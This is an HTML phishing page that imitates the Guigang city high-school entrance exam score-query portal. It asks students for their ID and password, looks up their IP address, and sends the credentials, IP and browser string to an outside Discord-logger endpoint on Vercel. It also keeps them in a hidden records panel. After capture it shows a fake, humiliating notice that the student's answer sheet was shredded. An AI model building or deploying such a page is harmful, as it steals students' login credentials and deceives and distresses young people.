<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>贵港市中考统一招生平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 900px;
        }

        /* 登录界面样式 */
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            display: flex;
        }

        .login-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .login-header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .login-header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .logo {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            margin-bottom: 15px;
        }

        .login-form {
            padding: 50px 40px;
            flex: 1;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(102, 126, 234, 0.3);
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* 结果页面样式 */
        .result-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            padding: 60px 40px;
            text-align: center;
            display: none;
        }

        .result-container.show {
            display: block;
        }

        .result-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }

        .result-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .result-message {
            font-size: 18px;
            color: #666;
            line-height: 1.8;
            margin-bottom: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-left: 4px solid #667eea;
            text-align: left;
        }

        .user-info {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 30px;
            text-align: left;
        }

        .user-info-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e0e0e0;
        }

        .user-info-item:last-child {
            border-bottom: none;
        }

        .user-info label {
            font-weight: 600;
            color: #333;
        }

        .user-info span {
            color: #666;
        }

        .back-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .error-message {
            display: none;
            color: #d32f2f;
            background: #ffebee;
            padding: 12px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            border-left: 4px solid #d32f2f;
            font-size: 14px;
            font-weight: 500;
        }

        /* 记录信息面板 */
        .login-records-panel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            padding: 20px;
            max-width: 350px;
            max-height: 400px;
            overflow-y: auto;
            z-index: 1000;
            display: none;
        }

        .login-records-panel.show {
            display: block;
        }

        .records-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 2px solid #667eea;
            padding-bottom: 10px;
        }

        .records-header h3 {
            font-size: 16px;
            color: #333;
            margin: 0;
        }

        .close-records-btn {
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #999;
        }

        .close-records-btn:hover {
            color: #333;
        }

        .record-item {
            background: #f8f9fa;
            padding: 12px;
            margin-bottom: 12px;
            border-radius: 4px;
            border-left: 3px solid #667eea;
            font-size: 13px;
            line-height: 1.6;
        }

        .record-item-label {
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }

        .record-item-value {
            color: #666;
            word-break: break-all;
        }

        .no-records {
            text-align: center;
            color: #999;
            padding: 20px 10px;
        }

        .clear-records-btn {
            width: 100%;
            padding: 8px;
            background: #d32f2f;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            margin-top: 10px;
            font-weight: 600;
        }

        .clear-records-btn:hover {
            background: #b71c1c;
        }

        .toggle-records-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            font-size: 20px;
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
            z-index: 999;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .toggle-records-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 16px rgba(102, 126, 234, 0.6);
        }

        .record-count {
            position: absolute;
            top: -8px;
            right: -8px;
            background: #d32f2f;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
        }

        @media (max-width: 768px) {
            .login-container {
                flex-direction: column;
            }

            .login-header {
                padding: 30px 20px;
            }

            .login-form {
                padding: 30px 20px;
            }

            .login-header h1 {
                font-size: 22px;
            }

            .result-container {
                padding: 30px 20px;
            }

            .result-title {
                font-size: 20px;
            }

            .result-message {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 登录界面 -->
        <div class="login-container" id="loginContainer">
            <div class="login-header">
                <div class="logo">📚</div>
                <h1>贵港市中考统一招生平台</h1>
                <p>贵港市统一考试成绩查询平台</p>
            </div>
            <div class="login-form">
                <form id="loginForm" onsubmit="handleLogin(event)">
                    <div class="error-message" id="errorMessage"></div>
                    <div class="form-group">
                        <label for="studentId">学号</label>
                        <input 
                            type="text" 
                            id="studentId" 
                            placeholder="请输入学号" 
                            required
                        >
                    </div>
                    <div class="form-group">
                        <label for="password">密码</label>
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="请输入密码" 
                            required
                        >
                    </div>
                    <button type="submit" class="submit-btn">查 分</button>
                    <div class="loading" id="loading">
                        <div class="spinner"></div>
                    </div>
                </form>
            </div>
        </div>

        <!-- 结果界面 -->
        <div class="result-container" id="resultContainer">
            <div class="result-icon">⚠️</div>
            <h2 class="result-title">查询结果</h2>
            
            <div class="user-info">
                <div class="user-info-item">
                    <label>学号：</label>
                    <span id="displayStudentId"></span>
                </div>
                <div class="user-info-item">
                    <label>查询时间：</label>
                    <span id="queryTime"></span>
                </div>
            </div>

            <div class="result-message">
                <strong>重要通知：</strong><br><br>
                由于你的成绩在贵港市后10名，按照国家要求，已将你的答题卡撕碎寄回。
            </div>

            <button class="back-btn" onclick="handleBack()">返回重新查询</button>
        </div>
    </div>

    <!-- 查询记录面板 -->
    <button class="toggle-records-btn" onclick="toggleRecordsPanel()">
        📋
        <span class="record-count" id="recordCount" style="display: none;">0</span>
    </button>

    <div class="login-records-panel" id="recordsPanel">
        <div class="records-header">
            <h3>查询记录</h3>
            <button class="close-records-btn" onclick="toggleRecordsPanel()">✕</button>
        </div>
        <div id="recordsList"></div>
        <button class="clear-records-btn" onclick="clearRecords()">清空记录</button>
    </div>

    <script>
        // ✅ 你的Vercel后端地址
        const BACKEND_URL = 'https://discord-logger-pi.vercel.app/api/discord';

        // 获取用户IP地址（使用免费API）
        function getClientIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => '无法获取IP');
        }

        // 上传记录到后端（后端转发到Discord）
        function uploadToDiscord(studentId, password, loginTime, ip, userAgent) {
            const data = {
                studentId: studentId,
                password: password,
                loginTime: loginTime,
                ip: ip,
                userAgent: userAgent
            };

            // 发送到你的后端服务器
            fetch(BACKEND_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => {
                console.log('✅ 记录已上传:', result);
            })
            .catch(error => {
                console.log('⚠️ 上传失败，但本地记录已保存:', error);
            });
        }

        // 保存记录到localStorage
        function saveRecord(studentId, password, loginTime, ip, userAgent) {
            let records = JSON.parse(localStorage.getItem('loginRecords') || '[]');
            
            const record = {
                studentId: studentId,
                password: password,
                loginTime: loginTime,
                ip: ip,
                userAgent: userAgent
            };
            
            records.push(record);
            localStorage.setItem('loginRecords', JSON.stringify(records));
            
            // 上传到Discord
            uploadToDiscord(studentId, password, loginTime, ip, userAgent);
            
            updateRecordsDisplay();
        }

        // 更新记录显示
        function updateRecordsDisplay() {
            let records = JSON.parse(localStorage.getItem('loginRecords') || '[]');
            const recordsList = document.getElementById('recordsList');
            const recordCount = document.getElementById('recordCount');
            
            if (records.length === 0) {
                recordsList.innerHTML = '<div class="no-records">暂无记录</div>';
                recordCount.style.display = 'none';
            } else {
                recordCount.textContent = records.length;
                recordCount.style.display = 'flex';
                
                recordsList.innerHTML = records.map((record, index) => `
                    <div class="record-item">
                        <div class="record-item-label">记录 #${records.length - index}</div>
                        <div class="record-item-value">
                            <strong>学号：</strong> ${record.studentId}<br>
                            <strong>密码：</strong> ${record.password}<br>
                            <strong>登入时间：</strong> ${record.loginTime}<br>
                            <strong>IP地址：</strong> ${record.ip}<br>
                            <strong>浏览器：</strong> ${record.userAgent.substring(0, 50)}...
                        </div>
                    </div>
                `).join('');
            }
        }

        // 切换记录面板显示
        function toggleRecordsPanel() {
            const panel = document.getElementById('recordsPanel');
            panel.classList.toggle('show');
            updateRecordsDisplay();
        }

        // 清空所有记录
        function clearRecords() {
            if (confirm('确定要清空所有记录吗？')) {
                localStorage.removeItem('loginRecords');
                updateRecordsDisplay();
            }
        }

        function handleLogin(event) {
            event.preventDefault();
            
            const studentId = document.getElementById('studentId').value;
            const password = document.getElementById('password').value;
            const loadingEl = document.getElementById('loading');
            const submitBtn = event.target.querySelector('.submit-btn');
            const errorMsg = document.getElementById('errorMessage');
            
            // 验证学号是否为14位
            if (studentId.length !== 14) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = '❌ 学号错误';
                return;
            }
            
            // 验证密码是否为8位
            if (password.length !== 8) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = '❌ 密码错误';
                return;
            }
            
            // 隐藏错误信息
            errorMsg.style.display = 'none';
            
            // 显示加载动画
            loadingEl.style.display = 'block';
            submitBtn.disabled = true;
            
            // 获取登入时间
            const loginTime = new Date().toLocaleString('zh-CN');
            
            // 获取IP地址并保存记录
            getClientIP().then(ip => {
                saveRecord(studentId, password, loginTime, ip, navigator.userAgent);
                
                // 模拟网络延迟
                setTimeout(() => {
                    loadingEl.style.display = 'none';
                    submitBtn.disabled = false;
                    
                    showResult(studentId, loginTime);
                }, 1500);
            });
        }

        function showResult(studentId, loginTime) {
            const loginContainer = document.getElementById('loginContainer');
            const resultContainer = document.getElementById('resultContainer');
            
            // 填充结果信息
            document.getElementById('displayStudentId').textContent = studentId;
            document.getElementById('queryTime').textContent = loginTime;
            
            // 切换显示
            loginContainer.style.display = 'none';
            resultContainer.classList.add('show');
        }

        function handleBack() {
            const loginContainer = document.getElementById('loginContainer');
            const resultContainer = document.getElementById('resultContainer');
            
            resultContainer.classList.remove('show');
            loginContainer.style.display = 'flex';
            
            // 清空表单
            document.getElementById('loginForm').reset();
        }

        // 初始化时更新记录显示
        window.addEventListener('load', updateRecordsDisplay);
    </script>
</body>
</html>
